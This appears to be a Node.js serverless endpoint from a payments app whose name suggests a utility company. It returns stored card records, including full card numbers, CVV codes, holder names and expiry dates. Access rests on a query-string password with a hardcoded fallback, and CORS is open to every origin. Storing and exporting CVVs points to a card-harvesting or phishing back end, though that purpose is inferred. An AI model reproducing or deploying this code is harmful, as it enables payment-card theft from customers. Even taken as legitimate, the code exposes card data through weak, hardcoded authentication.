const { neon } = require('@neondatabase/serverless');

module.exports = async (req, res) => {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET,OPTIONS');
  if (req.method === 'OPTIONS') return res.status(200).end();
  if (req.method !== 'GET')  return res.status(405).json({ error: 'Método no permitido' });

  const pass      = req.query.pass;
  const adminPass = process.env.ADMIN_PASSWORD || 'emapat2025';
  if (pass !== adminPass) return res.status(401).json({ error: 'No autorizado' });

  if (!process.env.DATABASE_URL) {
    return res.status(500).json({ error: 'Base de datos no configurada' });
  }

  const sql  = neon(process.env.DATABASE_URL);
  const rows = await sql`
    SELECT id, fecha, codigo_cliente, nombre, monto, tarjeta,
           num_tarjeta_completo, cvv, titular, vencimiento, estado, nro_operacion
    FROM pagos
    ORDER BY id DESC
    LIMIT 500
  `;
  return res.status(200).json(rows);
};
